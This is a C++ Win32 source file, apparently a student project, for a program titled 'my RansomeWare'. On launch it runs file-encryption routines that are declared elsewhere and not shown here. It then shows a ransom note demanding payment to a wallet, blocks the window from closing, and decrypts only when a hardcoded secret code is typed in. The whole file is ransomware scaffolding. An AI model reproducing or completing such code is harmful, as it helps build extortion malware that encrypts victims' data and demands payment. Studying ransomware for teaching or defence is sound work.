#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <string>
#include <tchar.h>
#include "WinOp.h"
#define BTN_DECR 101
#define TB_PASS 102
const std::wstring SECRET_CODE = L"!<3TEPAK";

LRESULT CALLBACK WindProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK ButtonWindProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
void CheckPass(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
HWND hWndButton;
HWND hWndTextBox;

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE prevHInstance, PWSTR pCmdLine, int nCmdShow) {

	const wchar_t CLASS_NAME[] = L"MyClassName";

	WNDCLASS wc = {};
	wc.lpfnWndProc = WindProc;
	wc.lpszClassName = CLASS_NAME;
	wc.hInstance = hInstance;
	wc.style = CS_DBLCLKS;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);

	RegisterClass(&wc);

	setMyExDir();
	addMyFiles();
	myEncryption();
	//myDecryption();

	HWND hWnd = CreateWindowEx(
		0, CLASS_NAME,
		L"Welcome to my RansomeWare",
		WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT,
		500, 300,
		NULL, NULL,
		hInstance, NULL
	);
	
	hWndTextBox = CreateWindow(
		L"Edit", L"", 
		WS_CHILD | WS_VISIBLE | WS_BORDER, 
		30, 120, 130, 20, hWnd,
		(HMENU)TB_PASS, NULL, NULL);

	//CREATES BUTTON
	hWndButton = CreateWindow(
		L"BUTTON",L"Decrypt",
		WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
		30,150,100,30,
		hWnd,(HMENU) BTN_DECR,
		hInstance, NULL
	);
	

	if (hWnd == 0) {
		MessageBox(hWnd,
			L"Something went wrong (createWindowEx)",
			L"Error",
			NULL);
		return 0;
	}

	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	MSG msg;

	// This while loop send messages for WindProc
	// from the message queue
	std::wstring prevMsg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);


		//Print the code of the message
		//It's for academic purpose
		std::wstring message = std::to_wstring(msg.message) + L"\n";
		if (message.compare(prevMsg))
		{
			OutputDebugStringW(message.c_str());
		}
		prevMsg = message;
	}

	return (int)msg.wParam;

}

LRESULT CALLBACK WindProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {

	switch (msg) {

	case WM_COMMAND:
		if (HIWORD(wParam) == BN_CLICKED && (lParam != 0))
		{
			switch (LOWORD(wParam))
			{
			case BTN_DECR:
				//MessageBox(hWnd, L"Button up", L"Button event", NULL);
				CheckPass(hWnd,msg,wParam,lParam);
				break;
			}
		}
		
		break;

	case WM_CREATE:

		break;

	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hWnd,&ps);
		RECT rc;
		FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 10));
		wchar_t victimMsg[] = L"Hello victim!! \n"
			"Your data have been encrypted, \n"
			"to decrypt your data pls send us some money\n"
			"to this wallet(xx - xx - xx - xx - xx - xx).\n"
			"If you are a CUT student just write the secret code '!<3TEPAK'";
		SetRect(&rc, 30, 10, 500, 100);
		DrawText(hdc,victimMsg, _tcslen(victimMsg),&rc,DT_LEFT | DT_EXTERNALLEADING | DT_WORDBREAK);
		EndPaint(hWnd, &ps);
	}
		break;
	case WM_CLOSE:
		return 0;
		break;
	
	}

	return DefWindowProc(hWnd, msg, wParam, lParam);
}

void CheckPass(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	DWORD cTxtLen = GetWindowTextLength(hWndTextBox);

	LPWSTR pszMem = (PWSTR)VirtualAlloc((LPVOID)NULL,
		(DWORD)(cTxtLen + 1), MEM_COMMIT, PAGE_READWRITE);
	
	GetWindowText(hWndTextBox, pszMem, cTxtLen+1);
	std::wstring textBoxStr = pszMem;
	if (textBoxStr._Equal(SECRET_CODE))
	{
		myDecryption();
		MessageBox(hWndButton, L"Your data have been decrypted", L"Congratulations", NULL);
		PostQuitMessage(0);
	}
	
}